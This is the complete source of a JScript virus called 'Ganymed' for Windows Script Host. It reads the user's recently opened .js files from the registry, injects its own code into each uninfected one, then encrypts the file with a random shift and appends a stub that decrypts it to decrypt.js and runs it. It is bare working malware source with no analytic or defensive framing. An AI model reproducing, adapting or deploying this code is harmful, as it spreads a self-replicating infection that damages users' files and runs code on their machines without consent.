Ganymed()
function Ganymed()
{
  var fso=WScript.CreateObject("Scripting.FileSystemObject")
  var shell=WScript.CreateObject("WScript.Shell")
  MRUList=shell.RegRead("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU\\js\\MRUList")
  for (i=1; i<=MRUList.length; i++)
  {
    file=shell.RegRead("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU\\js\\"+MRUList.substring(i-1,i))
    if (fso.FileExists(file))
    {
      var check=0; code=""; mycode=""; crypt="";
      var line=String.fromCharCode(13)+String.fromCharCode(10)
      victimfile=fso.OpenTextFile(file)
      viccontent=victimfile.ReadAll()
      victimfile.Close()
      infchecka=fso.OpenTextFile(file)
      infcheck=infchecka.ReadLine()
      infchecka.Close()
      if (infcheck!="/* Ganymed")
      {
        victimfile=fso.OpenTextFile(file)
        myfile=fso.OpenTextFile(WScript.ScriptFullName)
        for (j=0; j<500; j++)
        {
          code=myfile.ReadLine();
          if (code=="function Ganymed()") { mycode+=code+line; j=500; for (k=0; k<60; k++) { mycode+=myfile.ReadLine()+line } }
        }
        myfile.Close()
        for (l=1; l<viccontent.length; l++)
        {
          victimcodea=victimfile.Read(1)
          if (victimcodea=="f")
          {
            victimcodea+=victimfile.Read(7)
            l+=7;
            if (victimcodea=="function" && check==0 ) { var mark=l-8; var check=1}
          }
        }
        victimfile.Close()
        victimAll=fso.OpenTextFile(file)
        startcode=viccontent.substring(0,mark)
        endcode=viccontent.substring(mark,viccontent.length)
        victim=fso.OpenTextFile(file,2)
        victim.Write("Ganymed()"+line+startcode+line+mycode+line+endcode)
        victim.Close()
      }
      incry=fso.OpenTextFile(file)
      incontent=incry.ReadAll()
      incry.Close()
      rand=Math.round(Math.random()*5)+1
      for (i=0; i<incontent.length; i++)
      {
        crypt+=String.fromCharCode(incontent.charCodeAt(i)-rand)
      }
      cryptvic=fso.OpenTextFile(file,2)
      comma=String.fromCharCode(34)
      cryptvic.Write("/* Ganymed"+line+crypt+line+"*/"+line+"var fso=WScript.CreateObject("+comma+"Scripting.FileSystemObject"+comma+")"+line+"var shell=WScript.CreateObject("+comma+"WScript.Shell"+comma+")"+line+"openme=fso.OpenTextFile(WScript.ScriptFullName)"+line+"for (i=0; i<2; i++) { code=openme.ReadLine() }"+line+"openme.Close()"+line+"check=code.substring(0,1)"+line+"for (j=0; j<10; j++) { if (check=="+comma+"G"+comma+") { var dec=j; }"+line+"check=String.fromCharCode(check.charCodeAt(0)+1) }"+line+"var newcode="+comma+comma+";"+line+"for (k=0; k<code.length; k++) { newcode+=String.fromCharCode(code.charCodeAt(k)+dec) }"+line+"newfile=fso.CreateTextFile("+comma+"decrypt.js"+comma+")"+line+"newfile.Write(newcode)"+line+"newfile.Close()"+line+"shell.Run("+comma+"decrypt.js"+comma+")")
      cryptvic.Close()
    }
  }
}